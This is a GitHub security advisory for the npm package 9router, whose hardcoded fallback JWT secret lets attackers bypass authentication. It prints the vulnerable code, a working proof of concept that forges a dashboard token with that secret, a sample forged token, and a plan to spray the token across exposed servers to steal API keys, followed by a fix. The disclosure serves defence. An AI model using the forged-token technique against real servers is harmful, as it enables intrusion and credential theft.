# [C] 9router's Hardcoded Default fallback JWT Secret  Allows Authentication Bypass

## Summary
Severity: Critical
Advisory: GHSA-jphh-m39h-6gwx
CVE: CVE-2026-49352
CWE: CWE-798
Ecosystem: npm
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H (CVSS_V3)
Published: 2026-07-02
Source: https://github.com/advisories/GHSA-jphh-m39h-6gwx
Type: github-advisory

## Affected
- npm: `9router` — affected >=0.2.21 <0.4.45

## Details
### Summary
9router uses a publicly known hardcoded string `"9router-default-secret-change-me"` as the fallback of JWT secret for all Dashboard session JWTs when the `JWT_SECRET` environment variable is not set. Because this secret is committed in the public repository and unchanged across all releases, any unauthenticated remote attacker can forge a valid `auth_token` cookie and gain full access to dashboard and api (If JWT_SECRET is not set on server) . This vulnerable affected so many public 9router server
### Details
| Versions | File | Note |
|---|---|---|
| `>= 0.2.21, <= 0.4.30` | `src/app/api/auth/login/route.js` + `src/middleware.js` | Introduced in commit `23cfb19` |
| `>= 0.4.31, <= 0.4.41` | `src/lib/auth/dashboardSession.js` | Relocated by OIDC refactor `c3d91b0`, secret unchanged |

Vulnerable Code

**v0.2.21 – v0.4.30** — `src/app/api/auth/login/route.js` and `src/middleware.js`:

```js
const SECRET = new TextEncoder().encode(
  process.env.JWT_SECRET || "9router-default-secret-change-me"
);
```

**v0.4.31 – v0.4.41 (current)** — `src/lib/auth/dashboardSession.js` (centralized via OIDC refactor, commit `c3d91b0`):

```js
const SECRET = new TextEncoder().encode(
  process.env.JWT_SECRET || "9router-default-secret-change-me"
);
```
The fallback string was introduced in commit `23cfb19` (2026-01-09) and has never been removed. The OIDC refactor in `c3d91b0` only relocated it to a shared module . This vulnerability has existed since 9router first introduced authentication.
### PoC
**Step 1.** Craft a JWT signed with the known default secret:
```js
import { SignJWT } from "jose";

const SECRET = new TextEncoder().encode("9router-default-secret-change-me");

const token = await new SignJWT({ authenticated: true })
  .setProtectedHeader({ alg: "HS256" })
  .setIssuedAt()
  .setExpirationTime("36y")
  .sign(SECRET);

console.log(token); // example a valid auth_token=eyJhbGciOiJIUzI1NiJ9.eyJhdXRoZW50aWNhdGVkIjp0cnVlLCJpYXQiOjE3Nzg3Njk4NTYsImV4cCI6MjkxNDg0MzQ1Nn0.enMLEqYZKFuzxkmRH6qd3E-Ub-20wOjmiEfP4KyIG6w
```
**Step 2.** Set the forged token as the `auth_token` cookie. And access the `http://<target>/dashboard` - completely authentication bypass 

### Attack Scenario:
- Attacker can use this JWT to spray to all server that they found in the internet and gain dashboard access if a server doesn't set JWT_SECRET
- Then they can steal valuable API Key , Auth Token via http:// target /api/settings/database 


### Impact
- A successful attack grants attacker **full API Key, Auth Token** that 9router hold
- They can **read** 9router apikey, **change** 9router password ,shutdown 9router, **Modify** everything
- **Pivot** via the MCP stdio→SSE bridge exposed at `/api/mcp/`  (exploit CVE-2026-46339)

## Recommended Fix

**Require** `JWT_SECRET` at startup and fail fast rather than falling back silently:

```js
const jwtSecret = process.env.JWT_SECRET;
if (!jwtSecret) {
  throw new Error(
    "JWT_SECRET environment variable is not set. " +
    "Generate one with: openssl rand -hex 32"
  );
}
const SECRET = new TextEncoder().encode(jwtSecret);
```

Alternatively, auto-generate a random secret on first boot and persist it to the data directory — but **never** fall back to a publicly known constant.

## References
- https://github.com/decolua/9router/security/advisories/GHSA-jphh-m39h-6gwx
- https://github.com/decolua/9router
